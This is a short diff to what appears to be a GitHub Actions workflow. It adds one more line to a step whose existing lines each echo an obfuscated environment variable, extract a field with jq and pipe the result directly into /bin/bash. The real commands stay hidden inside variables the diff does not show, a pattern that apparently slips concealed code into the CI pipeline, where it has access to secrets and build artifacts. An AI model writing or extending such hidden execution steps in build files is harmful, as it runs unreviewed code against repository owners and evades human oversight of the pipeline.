@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$sm54919" | jq -r .gck7093 | /bin/bash
           echo $nyvx6 | jq -r .aevtx9 | /bin/bash
           echo $ts409 | jq -r .wh30 | /bin/bash
+          echo $l37 | jq -r .ncgxz11 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
